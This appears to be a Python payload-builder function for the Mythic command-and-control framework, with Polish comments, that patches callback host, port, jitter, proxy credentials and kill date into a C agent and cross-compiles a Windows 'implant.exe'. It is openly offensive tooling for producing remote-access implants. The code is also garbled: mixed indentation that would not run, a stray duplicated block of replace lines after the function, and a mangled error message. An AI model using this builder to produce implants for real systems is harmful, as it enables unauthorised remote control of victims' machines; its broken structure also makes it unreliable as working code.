from mythic_container.PayloadBuilder import *
import os
import subprocess
import tempfile
from pathlib import Path
from distutils.dir_util import copy_tree

async def sparsuj_i_skompiluj(self) -> BuildResponse:
    resp = BuildResponse(status=BuildStatus.Success)
    params = self.c2info[0].get_parameters_dict()
    
    # 1. Tworzymy tymczasowy folder (OS Agnostic!)
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        # Kopiujemy kod agenta do tymczasowego miejsca
        copy_tree(str(self.agent_code_path), str(temp_path))
        
        # 2. Definiujemy ścieżki przy użyciu pathlib
        main_c = temp_path / "main.c"
        patched_c = temp_path / "patched.c"
        output_exe = temp_path / "implant.exe"
        
        # 3. Wczytujemy i patchujemy
        with open(main_c, "r") as f:
            code = f.read()
            
        code = code.replace("REPLACE_ME_HOST", str(params["callback_host"]))
   		code = code.replace("REPLACE_ME_PORT", str(params["callback_port"]))
   		code = code.replace("REPLACE_ME_INTERVAL", str(params["callback_interval"]))
   		code = code.replace("REPLACE_ME_JITTER", str(params["callback_jitter"]))
   		code = code.replace("REPLACE_ME_GET_URI", params["get_uri"])
   		code = code.replace("REPLACE_ME_POST_URI", params["post_uri"])
   		code = code.replace("REPLACE_ME_QUERY_PATH_NAME", params["query_path_name"])
   		code = code.replace("REPLACE_ME_EEC", "1" if params["encrypted_exchange_check"] else "0")
   		code = code.replace("REPLACE_ME_PROXY_HOST", params.get("proxy_host", ""))
   		code = code.replace("REPLACE_ME_PROXY_PORT", params.get("proxy_port", ""))
   		code = code.replace("REPLACE_ME_PROXY_USER", params.get("proxy_user", ""))
   		code = code.replace("REPLACE_ME_PROXY_PASS", params.get("proxy_pass", ""))
   		code = code.replace("REPLACE_ME_KILLDATE", str(params["killdate"]))
        code = code.replace("REPLACE_ME_UUID", str(self.uuid))
        
        with open(patched_c, "w") as p:
            p.write(code)
            
        cmd = [
            "x86_64-w64-mingw32-gcc", 
            str(patched_c), 
            "-o", str(output_exe), 
            "-lws2_32", "-lwininet"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            with open(output_exe, "rb") as b:
                resp.payload = b.read()
        else:
            resp.status = BuildStatus.Error
            resp.build_message = f"comilation wylew: {result.stderr}"
            
    return resp








		code = code.replace("REPLACE_ME_HOST", params["callback_host"])
		code = code.replace("REPLACE_ME_UUID",self.uuid)
   		code = code.replace("REPLACE_ME_PORT", str(params["callback_port"]))
   		code = code.replace("REPLACE_ME_INTERVAL", str(params["callback_interval"]))
   		code = code.replace("REPLACE_ME_JITTER", str(params["callback_jitter"]))
   		code = code.replace("REPLACE_ME_GET_URI", params["get_uri"])
   		code = code.replace("REPLACE_ME_POST_URI", params["post_uri"])
   		code = code.replace("REPLACE_ME_QUERY_PATH_NAME", params["query_path_name"])
   		code = code.replace("REPLACE_ME_EEC", "1" if params["encrypted_exchange_check"] else "0")
   		code = code.replace("REPLACE_ME_PROXY_HOST", params.get("proxy_host", ""))
   		code = code.replace("REPLACE_ME_PROXY_PORT", params.get("proxy_port", ""))
   		code = code.replace("REPLACE_ME_PROXY_USER", params.get("proxy_user", ""))
   		code = code.replace("REPLACE_ME_PROXY_PASS", params.get("proxy_pass", ""))
   		code = code.replace("REPLACE_ME_KILLDATE", str(params["killdate"]))